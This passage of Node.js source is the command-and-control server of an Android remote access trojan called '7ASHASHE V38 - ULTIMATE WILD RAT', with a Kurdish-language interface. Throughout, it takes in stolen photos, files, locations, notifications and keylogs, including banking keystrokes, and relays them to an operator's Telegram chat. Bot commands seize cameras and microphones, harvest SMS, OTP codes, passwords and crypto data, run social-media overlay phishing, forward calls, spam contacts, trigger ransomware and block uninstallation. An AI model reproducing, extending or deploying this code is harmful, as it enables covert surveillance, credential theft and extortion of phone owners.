            `📝 **Changing Device Name**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 New Name: ${newName}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'change_device_name',
                name: newName,
                timestamp: Date.now()
            }));
        }
    }
}

const wifiBluetoothControl = new WifiBluetoothControl();

// =====================================================
// 🚀 SERVER SETUP
// =====================================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
const upload = multer({ 
    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
    storage: multer.memoryStorage()
});

// Store connected clients
const clients = new Map();

// Middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Powered-By', '7ASHASHE');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

// =====================================================
// 🏠 WEB INTERFACE
// =====================================================
app.get('/', (req, res) => {
    const db = readDB();
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ckb">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>7ASHASHE V38 - ULTIMATE WILD RAT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    background-image: 
                        linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent);
                    background-size: 50px 50px;
                }
                .container { max-width: 1400px; margin: 0 auto; }
                .header {
                    border: 3px solid #0f0;
                    padding: 30px;
                    margin-bottom: 30px;
                    background: #111;
                    box-shadow: 0 0 50px rgba(0,255,0,0.3);
                    text-align: center;
                }
                .header h1 {
                    font-size: 4em;
                    text-shadow: 0 0 20px #0f0;
                    animation: glitch 3s infinite;
                }
                @keyframes glitch {
                    0%,100% { text-shadow: 0 0 20px #0f0; }
                    25% { text-shadow: -5px 0 #f00, 5px 0 #00f; }
                    75% { text-shadow: 5px 0 #f00, -5px 0 #00f; }
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    border: 2px solid #0f0;
                    padding: 20px;
                    text-align: center;
                    background: #111;
                }
                .stat-value { font-size: 2.5em; font-weight: bold; }
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 30px 0;
                }
                .feature {
                    border: 1px solid #0f0;
                    padding: 15px;
                    text-align: center;
                    background: #111;
                }
                .footer {
                    text-align: center;
                    margin-top: 50px;
                    padding: 20px;
                    border-top: 2px solid #0f0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 7ASHASHE V38</h1>
                    <p>ULTIMATE WILD RAT</p>
                    <p>👑 Master: ${CONFIG.MASTER}</p>
                    <p>🌐 Port: ${CONFIG.PORT}</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${clients.size}</div>
                        <div>ئامێرە پەیوەستکراوەکان</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.notifications_captured || 0}</div>
                        <div>نۆتیفیکەیشن دزراو</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${screenStreamer.activeStreams}</div>
                        <div>Stream چالاک</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${smartKeylogger.logs.length}</div>
                        <div>کلیک تۆمارکراو</div>
                    </div>
                </div>
                
                <div class="feature-grid">
                    <div class="feature">🔄 Auto-Restart</div>
                    <div class="feature">📱 Notification Listener</div>
                    <div class="feature">📹 Screen Stream</div>
                    <div class="feature">⌨️ Smart Keylogger</div>
                    <div class="feature">🎭 Social Media Overlay</div>
                    <div class="feature">🔋 Battery Bypass</div>
                    <div class="feature">🛡️ Anti-Uninstall</div>
                    <div class="feature">🔓 Lock Screen Bypass</div>
                    <div class="feature">📞 Call Forwarding</div>
                    <div class="feature">📨 Contacts Spam</div>
                    <div class="feature">🛑 App Killer</div>
                    <div class="feature">💥 Self-Destruct</div>
                    <div class="feature">📶 WiFi Control</div>
                    <div class="feature">📱 Bluetooth Control</div>
                </div>
                
                <div class="footer">
                    <p>7ASHASHE V38 - ULTIMATE WILD RAT</p>
                    <p>🦁 💀 🔥</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// =====================================================
// 📤 FILE UPLOAD ENDPOINTS
// =====================================================
app.post('/upload/file', upload.single('file'), (req, res) => {
    try {
        const { model, uuid, type, path: filePath } = req.headers;
        const { originalname, buffer, size } = req.file;
        
        const fileName = `${Date.now()}_${originalname}`;
        let saveDir = DIRS.FILES;
        
        switch(type) {
            case 'photo': saveDir = DIRS.PHOTOS; break;
            case 'video': saveDir = DIRS.VIDEOS; break;
            case 'audio': saveDir = DIRS.AUDIO; break;
            default: saveDir = DIRS.FILES;
        }
        
        const savePath = path.join(saveDir, fileName);
        fs.writeFileSync(savePath, buffer);
        
        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
            caption: `📁 **فایلی نوێ**\n\n` +
                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
                    `📄 ناو: ${originalname}\n` +
                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
                    `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...\n` +
                    `🔒 Encrypted: ✅`,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true, fileName });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upload/text', (req, res) => {
    const { model, uuid, type } = req.headers;
    const { text } = req.body;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
        `${text}\n\n` +
        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

app.post('/upload/location', (req, res) => {
    const { model, uuid } = req.headers;
    const { lat, lon } = req.body;
    
    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
    bot.sendMessage(CONFIG.CHAT_ID,
        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🔌 WEBSOCKET CONNECTION
// =====================================================
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        model: req.headers.model || 'نەزانراو',
        manufacturer: req.headers.manufacturer || 'نەزانراو',
        androidVersion: req.headers.android || 'نەزانراو',
        battery: req.headers.battery || 'نەزانراو',
        ram: req.headers.ram || 'نەزانراو',
        storage: req.headers.storage || 'نەزانراو',
        root: req.headers.root || 'نەزانراو',
        miui: req.headers.miui || 'نەزانراو',
        country: req.headers.country || 'نەزانراو',
        carrier: req.headers.carrier || 'نەزانراو',
        networkType: req.headers.network || 'نەزانراو'
    };
    
    clients.set(clientId, { ws, info: clientInfo });
    
    // Update database
    const db = readDB();
    db.clients[clientId] = clientInfo;
    db.stats.total_connections++;
    writeDB(db);
    
    // Notify master
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
        `🔋 **پاتری:** ${clientInfo.battery}\n` +
        `💾 **RAM:** ${clientInfo.ram}\n` +
        `📁 **Storage:** ${clientInfo.storage}\n` +
        `🔓 **Root:** ${clientInfo.root}\n` +
        `🔥 **MIUI Bypass:** ${clientInfo.miui}\n` +
        `🌍 **وڵات:** ${clientInfo.country}\n` +
        `📡 **کەریەر:** ${clientInfo.carrier}\n` +
        `🌐 **IP:** ${clientInfo.ip}\n` +
        `🆔 **ID:** ${clientId.substring(0, 8)}...\n` +
        `🔒 **Encrypted:** ✅`,
        { parse_mode: 'Markdown' }
    );
    
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            clientInfo.lastSeen = new Date().toISOString();
            
            switch(message.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'data':
                    const { dataType, content } = message;
                    logToFile(dataType, { clientId, content });
                    break;
                    
                case 'notification':
                    notificationListener.captureNotification(message.notification);
                    break;
                    
                case 'keylog':
                    smartKeylogger.logKey(clientId, message.key, message.app);
                    break;
                    
                case 'screen_frame':
                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
                    if (stream) {
                        stream.frames++;
                    }
                    break;
                    
                case 'spam_progress':
                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
                    break;
                    
                case 'call_forwarded':
                    const forward = callForwarding.forwardings.get(message.forwardId);
                    if (forward) {
                        forward.forwardedCalls++;
                    }
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
            `🆔 ID: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    });
    
    ws.send(JSON.stringify({ type: 'init', clientId }));
});

// =====================================================
// 🤖 TELEGRAM BOT - UPDATED WITH ALL COMMANDS
// =====================================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔴 **7ASHASHE V38 - ULTIMATE WILD RAT**\n\n' +
        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
        '📱 **نۆتیفیکەیشن** - بینینی نۆتیفیکەیشنە دزراوەکان\n' +
        '📹 **Stream** - بینینی Streamە چالاکەکان\n' +
        '⌨️ **Keylogs** - بینینی کێڤلۆگەکان\n' +
        '🔧 **Advanced** - فەرمانە پێشکەوتووەکان',
        {
            reply_markup: {
                keyboard: [
                    ['📱 ئامێرەکان', '📊 ئامار'],
                    ['⚡ فەرمانەکان', '📱 نۆتیفیکەیشن'],
                    ['📹 Stream', '⌨️ Keylogs'],
                    ['🔧 Advanced']
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/📱 نۆتیفیکەیشن/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const notifications = notificationListener.getNotifications().slice(-10).reverse();
    
    if (notifications.length === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '📭 **هیچ نۆتیفیکەیشنێک نەدزراوە**');
        return;
    }
    
    let text = '📱 **دوایین نۆتیفیکەیشنەکان**\n\n';
    notifications.forEach((n, i) => {
        text += `${i+1}. **${n.app}**\n`;
        text += `   📌 ${n.title}\n`;
        text += `   📝 ${n.text}\n`;
        text += `   ⏰ ${new Date(n.timestamp).toLocaleTimeString()}\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/📹 Stream/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const streams = screenStreamer.getActiveStreams();
    
    if (streams.length === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '📹 **هیچ Streamێک چالاک نییە**');
        return;
    }
    
    let text = '📹 **Streamە چالاکەکان**\n\n';
    streams.forEach((s, i) => {
        const duration = Math.floor((Date.now() - new Date(s.startedAt)) / 1000);
        text += `${i+1}. **Client:** ${s.clientId.substring(0, 8)}...\n`;
        text += `   📊 Frames: ${s.frames}\n`;
        text += `   ⏱️ Duration: ${duration}s\n`;
        text += `   🆔 Stream: ${s.id.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/⌨️ Keylogs/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const logs = smartKeylogger.getLogs().slice(-20).reverse();
    const bankingLogs = smartKeylogger.getBankingLogs();
    
    if (logs.length === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '⌨️ **هیچ کێڤلۆگێک نەتۆمارکراوە**');
        return;
    }
    
    let text = '⌨️ **دوایین کێڤلۆگەکان**\n\n';
    logs.forEach((l, i) => {
        text += `${i+1}. **${l.app}** ${l.isSensitive ? '💰' : ''}\n`;
        text += `   ⌨️ ${l.key}\n`;
        text += `   ⏰ ${new Date(l.timestamp).toLocaleTimeString()}\n\n`;
    });
    
    text += `💰 **Banking Logs:** ${bankingLogs.length}`;
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/🔧 Advanced/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔧 **Advanced Control Panel**\n\n' +
        '📊 **Device Control**\n' +
        '   /lock_screen - قوفڵکردنی شاشە\n' +
        '   /wake_up - هەستانەوەی شاشە\n' +
        '   /keep_screen - شاشە بەردەوام بێت\n' +
        '   /rename_device - گۆڕینی ناوی ئامێر\n\n' +
        '📞 **Call Control**\n' +
        '   /forward_calls - گواستنەوەی پەیوەندی\n' +
        '   /stop_forward - وەستاندنی گواستنەوە\n\n' +
        '📨 **Message Control**\n' +
        '   /spam_contacts - ناردنی نامە بۆ هەموو کۆنتاکتەکان\n' +
        '   /block_app - بلۆکی ئەپێک\n' +
        '   /kill_app - وەستاندنی ئەپێک\n\n' +
        '📶 **Network Control**\n' +
        '   /wifi_on - وایفای داگیرسێنە\n' +
        '   /wifi_off - وایفای بکوژێنە\n' +
        '   /bluetooth_on - بلوتوس داگیرسێنە\n' +
        '   /bluetooth_off - بلوتوس بکوژێنە\n\n' +
        '💥 **Danger Zone**\n' +
        '   /self_destruct - لەناوبردنی هەموو شتێک',
        { parse_mode: 'Markdown' }
    );
});

// =====================================================
// 🎯 COMMAND HANDLERS
// =====================================================

// Wake up screen
bot.onText(/\/wake_up/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `wake:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ هەستانەوەی شاشە**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// Keep screen on
bot.onText(/\/keep_screen/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `keep_screen:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ بەردەوام بوونی شاشە**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// Rename device
bot.onText(/\/rename_device/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '📝 **ناوی نوێ بنووسە بۆ ئامێرەکە**',
        { reply_markup: { force_reply: true } }
    );
});

// Forward calls
bot.onText(/\/forward_calls/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '📞 **ژمارە تەلەفۆن بنووسە بۆ گواستنەوەی پەیوەندی**\n\n' +
        'نموونە: +964**********',
        { reply_markup: { force_reply: true } }
    );
});

// Spam contacts
bot.onText(/\/spam_contacts/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '📝 **پەیامەکە بنووسە بۆ ناردن بە هەموو کۆنتاکتەکان**',
        { reply_markup: { force_reply: true } }
    );
});

// Self destruct
bot.onText(/\/self_destruct/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '💥 **⚠️⚠️⚠️ SELF-DESTRUCT ⚠️⚠️⚠️**\n\n' +
        'ئەم فەرمانە هەموو داتاکان لەناودەبات\n\n' +
        'بۆ پشتڕاستکردنەوە، ئەم پاسۆردە بنووسە:',
        { reply_markup: { force_reply: true } }
    );
});

// WiFi on
bot.onText(/\/wifi_on/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `wifi_on:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ داگیرساندنی وایفای**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// WiFi off
bot.onText(/\/wifi_off/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `wifi_off:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ کوژاندنەوەی وایفای**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// Bluetooth on
bot.onText(/\/bluetooth_on/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `bluetooth_on:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ داگیرساندنی بلوتوس**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// Bluetooth off
bot.onText(/\/bluetooth_off/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `bluetooth_off:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە بۆ کوژاندنەوەی بلوتوس**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// =====================================================
// 🔘 CALLBACK QUERY HANDLER (UPDATED)
// =====================================================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, clientId] = callbackQuery.data.split(':');
    
    if (command === 'device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            });
            return;
        }
        
        bot.editMessageText(
            `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
            `📱 **ئەندرۆید:** ${client.info.androidVersion}\n` +
            `🔋 **پاتری:** ${client.info.battery}\n` +
            `💾 **RAM:** ${client.info.ram}\n` +
            `📁 **Storage:** ${client.info.storage}\n` +
            `🔓 **Root:** ${client.info.root}\n` +
            `🌍 **وڵات:** ${client.info.country}\n` +
            `📡 **کەریەر:** ${client.info.carrier}\n` +
            `🌐 **IP:** ${client.info.ip}\n` +
            `🕐 **پەیوەست بوو:** ${new Date(client.info.connectedAt).toLocaleString()}\n\n` +
            `**⚡ فەرمانێک هەڵبژێرە:**`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        // Basic Commands
                        [
                            { text: '📸 وێنەی پشت', callback_data: `camera_back:${clientId}` },
                            { text: '🤳 وێنەی پێش', callback_data: `camera_front:${clientId}` }
                        ],
                        [
                            { text: '📹 ڤیدیۆی پشت', callback_data: `video_back:${clientId}` },
                            { text: '🎥 ڤیدیۆی پێش', callback_data: `video_front:${clientId}` }
                        ],
                        [
                            { text: '📸 دزینی وێنەکان', callback_data: `get_photos:${clientId}` },
                            { text: '📹 دزینی ڤیدیۆکان', callback_data: `get_videos:${clientId}` }
                        ],
                        [
                            { text: '📸 سکرین شۆت', callback_data: `screenshot:${clientId}` },
                            { text: '📹 تۆماری شاشە', callback_data: `screen_record:${clientId}` }
                        ],
                        [
                            { text: '📹 Screen Stream', callback_data: `screen_stream:${clientId}` },
                            { text: '⏹️ Stop Stream', callback_data: `stop_stream:${clientId}` }
                        ],
                        [
                            { text: '🎤 تۆماری دەنگ', callback_data: `microphone:${clientId}` },
                            { text: '📞 تۆماری پەیوەندی', callback_data: `call_record:${clientId}` }
                        ],
                        
                        // Data Extraction
                        [
                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` },
                            { text: '📋 کلیپبۆرد', callback_data: `clipboard:${clientId}` }
                        ],
                        [
                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
                            { text: '👥 کۆنتاکتەکان', callback_data: `contacts:${clientId}` }
                        ],
                        [
                            { text: '📞 پەیوەندییەکان', callback_data: `calls:${clientId}` },
                            { text: '📨 SMS', callback_data: `sms:${clientId}` }
                        ],
                        [
                            { text: '🔐 OTP', callback_data: `otp:${clientId}` },
                            { text: '📤 ناردنی SMS', callback_data: `send_sms:${clientId}` }
                        ],
                        
                        // Advanced Features
                        [
                            { text: '📱 Start Notifications', callback_data: `start_notifications:${clientId}` },
                            { text: '📱 Stop Notifications', callback_data: `stop_notifications:${clientId}` }
                        ],
                        [
                            { text: '⌨️ Start Smart Keylogger', callback_data: `start_smart_keylogger:${clientId}` },
                            { text: '⌨️ Stop Smart Keylogger', callback_data: `stop_smart_keylogger:${clientId}` }
                        ],
                        [
                            { text: '🎭 Facebook Overlay', callback_data: `overlay_facebook:${clientId}` },
                            { text: '🎭 Instagram Overlay', callback_data: `overlay_instagram:${clientId}` }
                        ],
                        
                        // Apps & Passwords
                        [
                            { text: '📱 ئەپەکان', callback_data: `apps:${clientId}` },
                            { text: '🔑 پاسۆردەکان', callback_data: `passwords:${clientId}` }
                        ],
                        [
                            { text: '🔐 2FA', callback_data: `twofa:${clientId}` },
                            { text: '📧 Gmail', callback_data: `gmail:${clientId}` }
                        ],
                        
                        // Crypto & Ransomware
                        [
                            { text: '💳 Crypto', callback_data: `crypto:${clientId}` },
                            { text: '💣 ڕانسۆمویر', callback_data: `ransomware:${clientId}` }
                        ],
                        
                        // File System
                        [
                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` },
                            { text: '📂 وەرگرتنی فایل', callback_data: `download_file:${clientId}` }
                        ],
                        
                        // Advanced Control
                        [
                            { text: '🔓 Admin', callback_data: `admin:${clientId}` },
                            { text: '❄️ Freeze', callback_data: `freeze:${clientId}` }
                        ],
                        [
                            { text: '🚫 Hide Icon', callback_data: `hide_icon:${clientId}` },
                            { text: '🔄 Update', callback_data: `update:${clientId}` }
                        ],
                        
                        // New Advanced Features
                        [
                            { text: '🔓 Wake Up', callback_data: `wake:${clientId}` },
                            { text: '🔒 Keep Screen', callback_data: `keep_screen:${clientId}` }
                        ],
                        [
                            { text: '📞 Forward Calls', callback_data: `forward_calls:${clientId}` },
                            { text: '📨 Spam Contacts', callback_data: `spam_contacts:${clientId}` }
                        ],
                        [
                            { text: '🛑 Kill App', callback_data: `kill_app:${clientId}` },
                            { text: '🚫 Block App', callback_data: `block_app:${clientId}` }
                        ],
                        [
                            { text: '📶 WiFi On', callback_data: `wifi_on:${clientId}` },
                            { text: '📶 WiFi Off', callback_data: `wifi_off:${clientId}` }
                        ],
                        [
                            { text: '📱 Bluetooth On', callback_data: `bluetooth_on:${clientId}` },
                            { text: '📱 Bluetooth Off', callback_data: `bluetooth_off:${clientId}` }
                        ],
                        [
                            { text: '💥 Self Destruct', callback_data: `self_destruct:${clientId}` },
                            { text: 'ℹ️ Info', callback_data: `info:${clientId}` }
                        ]
                    ]
                },
                parse_mode: 'Markdown'
            }
        );
    }
    
    // Handle new advanced commands
    const advancedCommands = [
        'wake', 'keep_screen', 'forward_calls', 'spam_contacts',
        'kill_app', 'block_app', 'wifi_on', 'wifi_off',
        'bluetooth_on', 'bluetooth_off', 'self_destruct'
    ];
    
    if (advancedCommands.includes(command)) {
        const client = clients.get(clientId);
        if (!client) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                show_alert: true
            });
            return;
        }
        
        // Send command via WebSocket
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: `✅ ${command} command sent`,
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **Command Sent**\n\n` +
                `📱 Client: ${client.info.manufacturer} ${client.info.model}\n` +
                `⚡ Command: ${command}\n` +
                `🕐 Time: ${new Date().toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
                show_alert: true
            });
        }
    }
});

// =====================================================
// 🔄 PING & KEEP ALIVE
// =====================================================
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    });
    
    // Keep Railway alive
    axios.get(`https://${process.env.RAILWAY_STATIC_URL || 'localhost'}:${CONFIG.PORT}`).catch(() => {});
}, CONFIG.PING_INTERVAL);

// =====================================================
// 🚀 START SERVER
// =====================================================
server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V38 running on port ${CONFIG.PORT}`);
    console.log(`🌐 http://localhost:${CONFIG.PORT}`);
    console.log(`🔥 ULTIMATE WILD RAT - ${CONFIG.MASTER}`);
    console.log(`🔒 Encryption: AES-256-CBC`);
    console.log(`📁 Data directory: ${DIRS.DATA}`);
    
    // Install all modules
    setupAutoRestart();
    setupBatteryOptimizationBypass();
    setupAntiUninstall();
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔥 **7ASHASHE V38 - ULTIMATE WILD RAT**\n\n` +
        `👑 **Master: ${CONFIG.MASTER}**\n` +
        `📊 وەشان: ${CONFIG.VERSION}\n` +
        `🌐 پۆرت: ${CONFIG.PORT}\n` +
        `🖥️ Platform: ${os.platform()}\n` +
        `⏱️ Start Time: ${new Date().toLocaleString()}\n\n` +
        `✅ **تایبەتمەندییەکان:**\n` +
        `• دزینی وێنە و ڤیدیۆ و دەنگ\n` +
        `• کۆنترۆڵی کامێرا و مایکرۆفۆن\n` +
        `• کێڤلۆگەر و کلیپبۆرد\n` +
        `• دزینی کۆنتاکت و SMS و پەیوەندی\n` +
